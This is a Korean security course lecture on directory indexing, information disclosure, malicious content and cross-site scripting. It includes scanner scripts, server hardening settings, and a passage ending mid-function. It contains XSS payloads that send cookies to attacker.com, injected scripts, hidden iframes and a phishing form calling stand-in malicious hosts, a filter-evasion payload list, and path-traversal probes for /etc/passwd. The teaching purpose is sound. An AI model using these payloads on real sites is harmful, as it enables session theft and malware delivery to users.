# 18강: 정보 노출 및 콘텐츠 보안

## 개요
해킹보안전문가 1급 과정의 18강으로, 웹 애플리케이션에서 발생하는 정보 노출 취약점과 악성 콘텐츠 관련 보안 위험을 다룹니다. 디렉토리 인덱싱, 정보 누출, 악성 콘텐츠, XSS(크로스사이트스크립트) 등의 취약점을 심층 분석하고 효과적인 대응 방안을 학습합니다.

## 주요 학습 내용

### 1. 디렉토리 인덱싱 (Directory Indexing)

#### 취약점 개요
**웹 애플리케이션을 사용하고 있는 서버의 미흡한 설정으로 인해 인덱싱 기능이 활성화가 되어있을 경우**, 공격자가 강제 브라우징을 통해 서버내의 모든 디렉터리 및 파일에 대해 인덱싱이 가능하여 웹 애플리케이션 및 서버의 주요 정보가 노출될 수 있는 취약점입니다.

- **위험도**: 중간 (시스템 파일 누출)
- **공격 대상**: 디렉토리 브라우징이 허용된 웹 서버

#### 디렉토리 인덱싱이란?
**'디렉토리(directory)'는 우리가 컴퓨터에서 확인할 수 있는 '폴더'와 같은 의미**입니다. 그리고 **인덱싱(indexing)이라는 영어단어는 '표시하기'의 뜻**을 가지고 있습니다. '디렉토리 인덱싱'을 합쳐서 해석해 보면 **'폴더를 표시하기' 정도의 의미**로 해석할 수 있습니다.

이 취약점이 존재한다면 **서버내의 폴더 및 파일구조를 알 수 있다**는 것입니다.

#### 공격 방법
```bash
# 기본 URL 마지막에 디렉토리명을 입력하여 테스트
http://www.sample.com/images/index.asp    # 정상 URL
http://www.sample.com/images/             # index.asp 제거 후 접근

# 일반적으로 테스트하는 디렉토리들
/icons/
/images/  
/admin/
/files/
/download/
/backup/
/config/
/logs/
/temp/
/uploads/
```

#### 디렉토리 인덱싱 자동 탐지 도구
```python
#!/usr/bin/env python3
# 디렉토리 인덱싱 취약점 탐지 도구

import requests
import re
from urllib.parse import urljoin, urlparse
import threading
import queue
import time

class DirectoryIndexingScanner:
    def __init__(self, target_url, threads=10):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (DirectoryScanner/1.0)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        
        self.vulnerable_dirs = []
        self.threads = threads
        
        # 일반적인 디렉토리 목록
        self.common_directories = [
            'admin', 'administrator', 'management', 'manager',
            'config', 'configuration', 'conf', 'cfg',
            'backup', 'backups', 'bak', 'old',
            'temp', 'tmp', 'temporary',
            'logs', 'log', 'logging',
            'files', 'file', 'upload', 'uploads', 'download', 'downloads',
            'images', 'img', 'pics', 'pictures',
            'css', 'js', 'javascript', 'scripts',
            'include', 'includes', 'inc',
            'lib', 'library', 'libs',
            'data', 'database', 'db',
            'test', 'tests', 'testing',
            'dev', 'development', 'staging',
            'private', 'secure', 'protected',
            'api', 'webservice', 'ws',
            'assets', 'resources', 'static',
            'docs', 'documentation', 'help',
            'cache', 'cached',
            'bin', 'exe', 'executables'
        ]
        
        # 디렉토리 인덱싱 패턴
        self.indexing_patterns = [
            r'Index of /',
            r'Directory Listing',
            r'<title>Directory listing for',
            r'Parent Directory',
            r'\[DIR\]',
            r'<img[^>]*folder[^>]*>',
            r'Last modified</th>',
            r'<th.*>Size</th>',
            r'<A HREF="\.\.">\[To Parent Directory\]'
        ]
    
    def check_directory_indexing(self, directory):
        """개별 디렉토리에서 인덱싱 취약점 확인"""
        test_url = f"{self.target_url}/{directory}/"
        
        try:
            response = self.session.get(test_url, timeout=10, allow_redirects=True)
            
            # 응답 코드 확인
            if response.status_code == 200:
                content = response.text.lower()
                
                # 디렉토리 인덱싱 패턴 확인
                for pattern in self.indexing_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        files_found = self.extract_file_list(response.text)
                        return {
                            'url': test_url,
                            'status_code': response.status_code,
                            'content_length': len(response.text),
                            'files_count': len(files_found),
                            'files': files_found[:10],  # 최대 10개 파일만 저장
                            'vulnerability_type': 'Directory Indexing',
                            'severity': 'MEDIUM'
                        }
            
        except requests.RequestException as e:
            pass
            
        return None
    
    def extract_file_list(self, html_content):
        """HTML에서 파일 목록 추출"""
        files = []
        
        # 다양한 패턴으로 파일명 추출
        patterns = [
            r'<a href="([^"]+)"[^>]*>([^<]+)</a>',
            r'href="([^"]+\.(?:txt|log|bak|old|config|conf|sql|zip|tar|gz))"'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    filename = match[0] if match[0] not in ['.', '..'] else match[1]
                else:
                    filename = match
                
                if filename and filename not in ['.', '..', '/'] and not filename.startswith('http'):
                    files.append(filename)
        
        return list(set(files))  # 중복 제거
    
    def worker(self, dir_queue):
        """스레드 워커 함수"""
        while not dir_queue.empty():
            try:
                directory = dir_queue.get_nowait()
                result = self.check_directory_indexing(directory)
                
                if result:
                    self.vulnerable_dirs.append(result)
                    print(f"[발견] 디렉토리 인덱싱: {result['url']} ({result['files_count']}개 파일)")
                
                dir_queue.task_done()
                time.sleep(0.1)  # 요청 간 간격
                
            except queue.Empty:
                break
            except Exception as e:
                print(f"오류: {e}")
    
    def scan_common_directories(self):
        """일반적인 디렉토리들을 스캔"""
        print(f"디렉토리 인덱싱 스캔 시작: {self.target_url}")
        
        # 디렉토리 큐 생성
        dir_queue = queue.Queue()
        for directory in self.common_directories:
            dir_queue.put(directory)
        
        # 스레드 시작
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(dir_queue,))
            t.start()
            threads.append(t)
        
        # 모든 스레드 완료 대기
        for t in threads:
            t.join()
        
        return self.vulnerable_dirs
    
    def deep_scan(self, discovered_dirs):
        """발견된 디렉토리에서 추가 스캔"""
        print("추가 디렉토리 탐색 중...")
        
        for dir_info in discovered_dirs:
            base_path = dir_info['url'].replace(self.target_url + '/', '').rstrip('/')
            
            # 하위 디렉토리 추가 스캔
            for subdir in ['admin', 'config', 'backup', 'old', 'new']:
                full_path = f"{base_path}/{subdir}" if base_path else subdir
                result = self.check_directory_indexing(full_path)
                
                if result and result not in self.vulnerable_dirs:
                    self.vulnerable_dirs.append(result)
                    print(f"[추가 발견] 디렉토리 인덱싱: {result['url']}")
    
    def generate_report(self):
        """상세 보고서 생성"""
        if not self.vulnerable_dirs:
            return "디렉토리 인덱싱 취약점이 발견되지 않았습니다."
        
        report = f"""
=== 디렉토리 인덱싱 취약점 보고서 ===
대상 URL: {self.target_url}
스캔 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}
발견된 취약한 디렉토리: {len(self.vulnerable_dirs)}개

상세 내용:
"""
        
        for i, vuln in enumerate(self.vulnerable_dirs, 1):
            report += f"""
{i}. {vuln['url']}
   - 상태 코드: {vuln['status_code']}
   - 파일 개수: {vuln['files_count']}개
   - 주요 파일들:
"""
            for file in vuln['files'][:5]:
                report += f"     * {file}\n"
        
        # 보안 권장사항
        report += """
=== 보안 권장사항 ===
1. 웹 서버에서 디렉토리 인덱싱 기능을 비활성화하세요.
2. 각 디렉토리에 index.html 또는 default.asp 파일을 배치하세요.
3. 민감한 파일들은 웹 루트 디렉토리 외부에 저장하세요.
4. 접근 제어 설정을 통해 불필요한 디렉토리 접근을 차단하세요.
"""
        
        return report

# 사용 예시
if __name__ == "__main__":
    scanner = DirectoryIndexingScanner("http://testphp.vulnweb.com")
    
    # 기본 스캔
    vulnerabilities = scanner.scan_common_directories()
    
    # 추가 탐색
    if vulnerabilities:
        scanner.deep_scan(vulnerabilities)
    
    # 보고서 생성
    report = scanner.generate_report()
    print(report)
    
    # 결과를 파일로 저장
    with open('directory_indexing_report.txt', 'w', encoding='utf-8') as f:
        f.write(report)
```

#### 대응 방안

##### Apache 웹서버 설정
```apache
# httpd.conf 파일에서 디렉토리 인덱싱 비활성화

# 전체 서버에 대해 비활성화
<Directory "/var/www/html">
    Options -Indexes
    AllowOverride None
    Require all granted
</Directory>

# 특정 디렉토리만 비활성화
<Directory "/var/www/html/admin">
    Options -Indexes
    Order allow,deny
    Deny from all
</Directory>

# .htaccess 파일을 이용한 설정
Options -Indexes
IndexIgnore *
```

##### Nginx 웹서버 설정
```nginx
# nginx.conf에서 디렉토리 인덱싱 비활성화

server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    
    # 디렉토리 인덱싱 비활성화
    autoindex off;
    
    # 특정 디렉토리 접근 차단
    location /admin/ {
        deny all;
        return 403;
    }
    
    location /config/ {
        deny all;
        return 403;
    }
    
    # 민감한 파일 확장자 차단
    location ~* \.(bak|config|sql|fla|psd|ini|log|sh|inc|swp|dist)$ {
        deny all;
        return 403;
    }
}
```

##### IIS 웹서버 설정
```xml
<!-- web.config에서 디렉토리 브라우징 비활성화 -->
<configuration>
    <system.webServer>
        <directoryBrowse enabled="false" />
        
        <!-- 특정 디렉토리 접근 제한 -->
        <location path="admin">
            <system.web>
                <authorization>
                    <deny users="*" />
                </authorization>
            </system.web>
        </location>
    </system.webServer>
</configuration>
```

### 2. 정보 노출 (Information Disclosure)

#### 취약점 개요
**웹 애플리케이션의 민감한 정보가 개발자의 부주의로 인해 노출되는 것**으로 중요 정보(관리자 계정 및 테스트 계정 등)를 주석구문에 포함시켜 의도하지 않게 정보가 노출되는 취약점입니다.

#### 정보 노출 유형

##### 1. HTML 소스 코드 내 정보 노출
```html
<!-- 위험한 예시 -->
<!-- 관리자 계정: admin / admin123! -->
<!-- DB 접속 정보: server=192.168.1.100, user=dbadmin, pass=dbpass123 -->
<!-- TODO: 보안 취약점 수정 필요 -->
<input type="hidden" name="admin_flag" value="true">
<input type="hidden" name="debug_mode" value="1">
```

##### 2. robots.txt 파일을 통한 정보 노출
```
# robots.txt 파일 예시
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /config/
Disallow: /private/
Disallow: /test/
Disallow: /dev/
Disallow: /staging/
```

##### 3. 오류 메시지를 통한 정보 노출
```php
<?php
// 위험한 예시 - 상세한 오류 정보 노출
try {
    $db = new PDO("mysql:host=192.168.1.100;dbname=company_db", $username, $password);
} catch (PDOException $e) {
    echo "Database connection failed: " . $e->getMessage();
    echo "Host: 192.168.1.100, Database: company_db";
}

// 안전한 예시 - 일반적인 오류 메시지
try {
    $db = new PDO($dsn, $username, $password);
} catch (PDOException $e) {
    error_log("Database connection failed: " . $e->getMessage());
    echo "서비스에 일시적인 문제가 발생했습니다. 잠시 후 다시 시도해주세요.";
}
?>
```

#### 정보 노출 탐지 도구
```python
#!/usr/bin/env python3
# 웹 애플리케이션 정보 노출 탐지 도구

import requests
import re
from bs4 import BeautifulSoup
import json
from urllib.parse import urljoin

class InformationDisclosureScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (InfoScanner/1.0)'
        })
        
        self.findings = []
        
        # 민감한 정보 패턴
        self.sensitive_patterns = {
            'database_credentials': [
                r'(username|user|uid)\s*[=:]\s*["\']?(\w+)["\']?',
                r'(password|pass|pwd)\s*[=:]\s*["\']?([^"\']+)["\']?',
                r'(host|server)\s*[=:]\s*["\']?([^"\']+)["\']?',
                r'(database|db|dbname)\s*[=:]\s*["\']?(\w+)["\']?'
            ],
            'api_keys': [
                r'api[_-]?key["\']?\s*[=:]\s*["\']?([A-Za-z0-9]{20,})["\']?',
                r'secret[_-]?key["\']?\s*[=:]\s*["\']?([A-Za-z0-9]{20,})["\']?',
                r'access[_-]?token["\']?\s*[=:]\s*["\']?([A-Za-z0-9]{20,})["\']?'
            ],
            'email_addresses': [
                r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            ],
            'ip_addresses': [
                r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
            ],
            'file_paths': [
                r'[C-Z]:[\\\/][^"\'<>\s]+',
                r'\/[a-zA-Z0-9_\-\.\/]+\.(log|conf|config|bak|old|tmp)'
            ],
            'comments': [
                r'<!--.*?-->',
                r'\/\*.*?\*\/',
                r'\/\/.*?$'
            ]
        }
        
        # 민감한 파일 목록
        self.sensitive_files = [
            'robots.txt',
            'sitemap.xml',
            '.htaccess',
            'web.config',
            'config.php',
            'config.inc.php',
            'database.php',
            'db_config.php',
            'settings.php',
            'wp-config.php',
            'configuration.php',
            '.env',
            '.git/config',
            '.svn/entries',
            'package.json',
            'composer.json',
            'phpinfo.php',
            'info.php',
            'test.php',
            'debug.php'
        ]
    
    def scan_html_source(self, url):
        """HTML 소스 코드에서 민감한 정보 탐지"""
        try:
            response = self.session.get(url)
            if response.status_code == 200:
                content = response.text
                
                # BeautifulSoup으로 파싱
                soup = BeautifulSoup(content, 'html.parser')
                
                # HTML 주석 검사
                comments = soup.find_all(string=lambda text: isinstance(text, str) and 
                                       (text.strip().startswith('<!--') or 'password' in text.lower() or 'admin' in text.lower()))
                
                for comment in comments:
                    if any(keyword in comment.lower() for keyword in ['password', 'admin', 'user', 'key', 'secret']):
                        self.findings.append({
                            'type': 'HTML Comment Information Disclosure',
                            'url': url,
                            'content': comment.strip()[:200],
                            'severity': 'MEDIUM'
                        })
                
                # Hidden 필드 검사
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for input_tag in hidden_inputs:
                    name = input_tag.get('name', '')
                    value = input_tag.get('value', '')
                    
                    if any(keyword in name.lower() for keyword in ['admin', 'debug', 'test', 'dev']):
                        self.findings.append({
                            'type': 'Sensitive Hidden Field',
                            'url': url,
                            'field_name': name,
                            'field_value': value,
                            'severity': 'LOW'
                        })
                
                # 패턴 기반 정보 탐지
                for category, patterns in self.sensitive_patterns.items():
                    for pattern in patterns:
                        matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                        for match in matches:
                            self.findings.append({
                                'type': f'Information Disclosure - {category}',
                                'url': url,
                                'pattern': pattern,
                                'match': match.group(0),
                                'severity': 'MEDIUM' if category in ['database_credentials', 'api_keys'] else 'LOW'
                            })
                            
        except Exception as e:
            print(f"HTML 소스 스캔 오류 {url}: {e}")
    
    def scan_sensitive_files(self):
        """민감한 파일들을 스캔"""
        for filename in self.sensitive_files:
            file_url = urljoin(self.target_url + '/', filename)
            
            try:
                response = self.session.get(file_url)
                
                if response.status_code == 200:
                    content_type = response.headers.get('content-type', '').lower()
                    
                    # 파일이 실제로 존재하고 내용이 있는지 확인
                    if len(response.text) > 10 and 'text/html' not in content_type:
                        self.findings.append({
                            'type': 'Sensitive File Disclosure',
                            'url': file_url,
                            'filename': filename,
                            'content_length': len(response.text),
                            'content_preview': response.text[:500],
                            'severity': 'HIGH' if filename in ['.env', 'config.php', 'wp-config.php'] else 'MEDIUM'
                        })
                        
                        print(f"[발견] 민감한 파일: {file_url}")
                        
            except Exception as e:
                continue
    
    def scan_error_pages(self):
        """오류 페이지에서 정보 노출 확인"""
        error_triggers = [
            ('SQL Error', "' OR 1=1--"),
            ('File Not Found', '/nonexistent_file_123456'),
            ('PHP Error', '?debug=1'),
            ('ASP.NET Error', '/default.aspx?test='),
            ('Directory Traversal', '/../../../etc/passwd')
        ]
        
        for error_type, trigger in error_triggers:
            test_url = self.target_url + trigger
            
            try:
                response = self.session.get(test_url)
                content = response.text.lower()
                
                # 오류 메시지에서 민감한 정보 패턴 확인
                error_patterns = [
                    r'fatal error.*in.*line \d+',
                    r'warning.*mysql.*',
                    r'exception.*at.*line \d+',
                    r'stack trace:',
                    r'c:\\[^<\s]+',
                    r'\/var\/www\/[^<\s]+',
                    r'database.*connection.*failed'
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        self.findings.append({
                            'type': f'Error Message Information Disclosure - {error_type}',
                            'url': test_url,
                            'error_pattern': pattern,
                            'severity': 'MEDIUM'
                        })
                        break
                        
            except Exception as e:
                continue
    
    def scan_technology_fingerprinting(self):
        """기술 스택 정보 수집"""
        try:
            response = self.session.get(self.target_url)
            headers = response.headers
            
            # HTTP 헤더에서 기술 정보 추출
            tech_headers = {
                'Server': headers.get('Server', ''),
                'X-Powered-By': headers.get('X-Powered-By', ''),
                'X-AspNet-Version': headers.get('X-AspNet-Version', ''),
                'X-Generator': headers.get('X-Generator', ''),
                'X-Drupal-Cache': headers.get('X-Drupal-Cache', '')
            }
            
            for header_name, header_value in tech_headers.items():
                if header_value:
                    self.findings.append({
                        'type': 'Technology Information Disclosure',
                        'url': self.target_url,
                        'header': header_name,
                        'value': header_value,
                        'severity': 'LOW'
                    })
            
            # HTML 메타 태그에서 기술 정보 추출
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_generator = soup.find('meta', attrs={'name': 'generator'})
            if meta_generator:
                content = meta_generator.get('content', '')
                if content:
                    self.findings.append({
                        'type': 'Generator Meta Tag Disclosure',
                        'url': self.target_url,
                        'generator': content,
                        'severity': 'LOW'
                    })
                    
        except Exception as e:
            print(f"기술 스택 분석 오류: {e}")
    
    def run_full_scan(self):
        """전체 정보 노출 스캔 실행"""
        print(f"정보 노출 스캔 시작: {self.target_url}")
        
        # 1. 메인 페이지 HTML 소스 스캔
        self.scan_html_source(self.target_url)
        
        # 2. 민감한 파일 스캔
        self.scan_sensitive_files()
        
        # 3. 오류 페이지 스캔
        self.scan_error_pages()
        
        # 4. 기술 스택 정보 수집
        self.scan_technology_fingerprinting()
        
        return self.findings
    
    def generate_report(self):
        """상세 보고서 생성"""
        if not self.findings:
            return "정보 노출 취약점이 발견되지 않았습니다."
        
        # 심각도별 분류
        severity_counts = {'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for finding in self.findings:
            severity_counts[finding['severity']] += 1
        
        report = f"""
=== 정보 노출 취약점 보고서 ===
대상 URL: {self.target_url}
스캔 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}
총 발견 건수: {len(self.findings)}개

심각도별 분류:
- HIGH: {severity_counts['HIGH']}개
- MEDIUM: {severity_counts['MEDIUM']}개  
- LOW: {severity_counts['LOW']}개

상세 내용:
"""
        
        for i, finding in enumerate(self.findings, 1):
            report += f"""
{i}. [{finding['severity']}] {finding['type']}
   URL: {finding['url']}
"""
            
            if 'content' in finding:
                report += f"   내용: {finding['content']}\n"
            if 'filename' in finding:
                report += f"   파일명: {finding['filename']}\n"
            if 'match' in finding:
                report += f"   매칭: {finding['match']}\n"
        
        report += """
=== 보안 권장사항 ===
1. HTML 주석에서 민감한 정보를 제거하세요.
2. 오류 메시지에서 상세한 시스템 정보 노출을 방지하세요.
3. robots.txt 파일에 민감한 디렉토리 정보를 포함하지 마세요.
4. 개발/테스트용 파일들을 운영 서버에서 제거하세요.
5. HTTP 응답 헤더에서 불필요한 기술 정보를 제거하세요.
"""
        
        return report

# 사용 예시
if __name__ == "__main__":
    scanner = InformationDisclosureScanner("http://testphp.vulnweb.com")
    
    findings = scanner.run_full_scan()
    
    print(f"\n총 {len(findings)}개의 정보 노출 취약점 발견")
    
    for finding in findings[:5]:  # 상위 5개만 출력
        print(f"- [{finding['severity']}] {finding['type']}: {finding['url']}")
    
    # 상세 보고서
    report = scanner.generate_report()
    
    with open('information_disclosure_report.txt', 'w', encoding='utf-8') as f:
        f.write(report)
    
    print("\n상세 보고서가 저장되었습니다: information_disclosure_report.txt")
```

### 3. 악성콘텐츠 (Malicious Content)

#### 취약점 개요
**웹 애플리케이션에서 사용자 입력 값에 대한 필터링이 제대로 이루어지지 않을 경우** 공격자가 악성콘텐츠를 삽입할 수 있으며, 악성콘텐츠가 삽입된 페이지에 접속한 사용자는 악성코드 유포 사이트가 자동으로 호출되어 악성코드에 감염될 수 있는 취약점입니다.

#### 악성콘텐츠 유형
```html
<!-- 1. 악성 스크립트 삽입 -->
<script src="http://malicious-site.com/malware.js"></script>

<!-- 2. 자동 리다이렉트 -->
<script>window.location='http://malicious-site.com/exploit';</script>

<!-- 3. 숨겨진 프레임을 통한 공격 -->
<iframe src="http://malicious-site.com/exploit" width="0" height="0" frameborder="0"></iframe>

<!-- 4. 악성 플래시 파일 -->
<object data="malicious.swf" type="application/x-shockwave-flash"></object>

<!-- 5. 피싱 콘텐츠 -->
<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
  <form action="http://phishing-site.com/steal">
    계정 정보를 다시 입력해주세요: <input type="password">
  </form>
</div>
```

### 4. 크로스사이트스크립트 (XSS: Cross-Site Scripting)

#### 취약점 개요
**웹 애플리케이션에서 사용자 입력 값에 대한 필터링이 제대로 이루어지지 않을 경우**, 공격자가 입력이 가능한 폼(웹 브라우저 주소입력 또는 게시판 등)에 악의적인 스크립트를 삽입하여 사용자 세션 도용, 악성코드를 유포할 수 있는 취약점입니다.

#### XSS 공격 유형

##### 1. Reflected XSS (반사형 XSS)
```javascript
// URL 파라미터를 통한 반사형 XSS
// 공격 URL: search.php?q=<script>alert('XSS')</script>

// 취약한 PHP 코드
<?php
$query = $_GET['q'];
echo "검색어: " . $query;  // 위험: 입력값을 그대로 출력
?>

// 공격 페이로드
?q=<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

##### 2. Stored XSS (저장형 XSS)
```html
<!-- 게시판에 저장되는 XSS -->
제목: 일반적인 게시글 제목
내용: 안녕하세요. <script>alert('XSS')</script> 좋은 정보입니다.

<!-- 더 악의적인 저장형 XSS -->
<img src="x" onerror="
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie, true);
xhr.send();
">
```

##### 3. DOM-based XSS
```javascript
// 클라이언트 사이드에서 발생하는 XSS
function search() {
    var query = document.location.hash.substr(1);
    document.getElementById('results').innerHTML = '검색어: ' + query;
}

// 공격 URL: page.html#<img src=x onerror=alert('XSS')>
```

#### XSS 공격 페이로드 모음
```javascript
// 기본적인 XSS 페이로드
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')"></iframe>

// 필터 우회 기법
<ScRiPt>alert('XSS')</ScRiPt>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<img src="javascript:alert('XSS')">
<svg><script>alert('XSS')</script></svg>

// 이벤트 핸들러를 이용한 XSS
<img onmouseover="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<select onfocus="alert('XSS')" autofocus>
<textarea onfocus="alert('XSS')" autofocus>
<keygen onfocus="alert('XSS')" autofocus>

// CSS를 이용한 XSS
<div style="background:url('javascript:alert(\'XSS\')')">
<style>@import 'javascript:alert("XSS")';</style>
```

#### 고급 XSS 탐지 도구
```python
#!/usr/bin/env python3
# 고급 XSS 취약점 탐지 도구

import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
import time
import json

class AdvancedXSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (XSSScanner/1.0)'
        })
        
        self.vulnerabilities = []
        
        # XSS 페이로드 카테고리별 분류
        self.payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "';alert('XSS');//"
            ],
            'attribute_escape': [
                '" onmouseover="alert(\'XSS\')" "',
                '\' onmouseover=\'alert("XSS")\' \'',
                '"><img src=x onerror=alert("XSS")>',
                '\' autofocus onfocus=alert("XSS") \''
            ],
            'filter_evasion': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<img src="jav&#x09;ascript:alert(\'XSS\')">',
                '<svg><script>alert("XSS")</script></svg>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<<SCRIPT>alert("XSS");//<</SCRIPT>'
            ],
            'event_handlers': [
                '<input onfocus="alert(\'XSS\')" autofocus>',
                '<select onfocus="alert(\'XSS\')" autofocus>',
                '<textarea onfocus="alert(\'XSS\')" autofocus>',
                '<keygen onfocus="alert(\'XSS\')" autofocus>',
                '<video><source onerror="alert(\'XSS\')">'
            ],
            'dom_based': [
                '#<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>'
            ]
        }
        
        # 성공 탐지 패턴
        self.success_patterns = [
            r'<script[^>]*>.*?alert\(["\']XSS["\'].*?</script>',
            r'<img[^>]*onerror[^>]*alert\(["\']XSS["\']',
            r'<svg[^>]*onload[^>]*alert\(["\']XSS["\']',
            r'javascript:alert\(["\']XSS["\']',
            r'on\w+=["\'].*?alert\(["\']XSS["\']'
        ]
    
    def test_reflected_xss(self, param_name, original_value):
        """반사형 XSS 테스트"""
        for category, payloads in self.payloads.items():
            for payload in payloads:
                test_value = payload
                
                try:
                    # GET 요청 테스트
                    params = {param_name: test_value}
                    response = self.session.get(self.target_url, params=params)
                    
                    if self.check_xss_success(response.text, payload):
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'category': category,
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'GET',
                            'url': self.target_url,
                            'evidence': self.extract_xss_evidence(response.text, payload),
                            'severity': 'HIGH'
                        })
                        
                        print(f"[발견] Reflected XSS: {param_name} - {payload[:50]}...")
                    
                    # POST 요청 테스트
                    data = {param_name: test_value}
                    response = self.session.post(self.target_url, data=data)
                    
                    if self.check_xss_success(response.text, payload):
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'category': category,
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'POST',
                            'url': self.target_url,
                            'evidence': self.extract_xss_evidence(response.text, payload),
                            'severity': 'HIGH'
                        })
                        
                except Exception as e:
                    continue
    
    def test_stored_xss(self, form_action, form_data):
        """저장형 XSS 테스트"""
        for category, payloads in self.payloads.items():
            for payload in payloads:
                # 각 입력 필드에 페이로드 삽입
                for field_name in form_data.keys():
                    if field_name.lower() in ['content', 'message', 'comment', 'description', 'title']:
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        try:
                            # 데이터 저장
                            response = self.session.post(form_action, data=test_data)
                            
                            # 저장된 데이터가 표시되는 페이지 확인
                            time.sleep(1)  # 서버 처리 시간 대기
                            check_response = self.session.get(self.target_url)
                            
                            if self.check_xss_success(check_response.text, payload):
                                self.vulnerabilities.append({
                                    'type': 'Stored XSS',
                                    'category': category,
                                    'parameter': field_name,
                                    'payload': payload,
                                    'form_action': form_action,
                                    'evidence': self.extract_xss_evidence(check_response.text, payload),
                                    'severity': 'CRITICAL'
                                })
                                
                                print(f"[발견] Stored XSS: {field_name} - {payload[:50]}...")
                                
                        except Exception as e:
                            continue
    
    def test_dom_xss(self):
        """DOM 기반 XSS 테스트"""
        dom_payloads = self.payloads['dom_based']
        
        for payload in dom_payloads:
            try:
                # 해시 프래그먼트를 이용한 DOM XSS 테스트
                test_url = f"{self.target_url}#{payload}"
                response = self.session.get(test_url)
                
                # JavaScript 코드에서 location.hash 사용 여부 확인
                if 'location.hash' in response.text or 'window.location.hash' in response.text:
                    self.vulnerabilities.append({
                        'type': 'DOM-based XSS (Potential)',
                        'payload': payload,
                        'url': test_url,
                        'evidence': 'JavaScript uses location.hash',
                        'severity': 'MEDIUM'
                    })
                    
                    print(f"[발견] 잠재적 DOM XSS: {payload}")
                    
            except Exception as e:
                continue
    
    def check_xss_success(self, response_text, payload):
        """XSS 성공 여부 확인"""
        # HTML 인코딩된 문자 디코딩
        decoded_response = response_text.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"')
        
        # 페이로드가 그대로 응답에 포함되어 있는지 확인
        if payload in decoded_response:
            return True
        
        # 정규표현식 패턴으로 확인
        for pattern in self.success_patterns:
            if re.search(pattern, decoded_response, re.IGNORECASE | re.DOTALL):
                return True
        
        return False
    
    def extract_xss_evidence(self, response_text, payload):
        """XSS 증거 추출"""
        lines = response_text.split('\n')
        
        for line in lines:
            if payload in line or any(keyword in line.lower() for keyword in ['script', 'onerror', 'onload']):
                return line.strip()[:200]
        
        return ""
    
    def discover_forms(self):
        """폼 발견 및 분석"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = []
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'fields': {}
                }
                
                # 입력 필드 추출
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    name = input_tag.get('name')
                    if name:
                        input_type = input_tag.get('type', 'text')
                        if input_type not in ['submit', 'button', 'reset']:
                            form_data['fields'][name] = 'test_value'
                
                if form_data['fields']:
                    forms.append(form_data)
            
            return forms
            
        except Exception as e:
            print(f"폼 발견 오류: {e}")
            return []
    
    def run_comprehensive_scan(self):
        """종합적인 XSS 스캔"""
        print(f"XSS 취약점 스캔 시작: {self.target_url}")
        
        # 1. 기본 파라미터를 이용한 반사형 XSS 테스트
        common_params = ['q', 'search', 'query', 'keyword', 'term', 'name', 'value', 'input', 'data']
        
        for param in common_params:
            self.test_reflected_xss(param, 'test')
        
        # 2. 폼 발견 및 저장형 XSS 테스트
        forms = self.discover_forms()
        for form in forms:
            form_action = urllib.parse.urljoin(self.target_url, form['action'])
            self.test_stored_xss(form_action, form['fields'])
        
        # 3. DOM 기반 XSS 테스트
        self.test_dom_xss()
        
        return self.vulnerabilities
    
    def generate_poc(self, vulnerability):
        """개념 증명(PoC) 생성"""
        if vulnerability['type'] == 'Reflected XSS':
            if vulnerability['method'] == 'GET':
                return f"{vulnerability['url']}?{vulnerability['parameter']}={urllib.parse.quote(vulnerability['payload'])}"
            else:
                return f"POST {vulnerability['url']}\nData: {vulnerability['parameter']}={vulnerability['payload']}"
        
        elif vulnerability['type'] == 'Stored XSS':
            return f"POST {vulnerability['form_action']}\nData: {vulnerability['parameter']}={vulnerability['payload']}"
        
